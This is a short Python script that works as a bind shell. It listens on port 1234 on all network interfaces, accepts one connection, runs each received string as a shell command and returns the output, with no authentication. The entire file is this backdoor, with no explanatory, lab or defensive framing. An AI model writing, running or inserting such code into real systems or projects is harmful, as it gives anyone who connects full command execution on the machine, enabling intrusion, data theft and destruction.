import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 1234))
s.listen(1)
conn, addr = s.accept()

while True:
    command = conn.recv(1024)
    if command.decode('utf-8') == 'exit':
        break
    output = subprocess.getoutput(command.decode('utf-8'))
    conn.send(output.encode('utf-8'))

conn.close()
s.close()
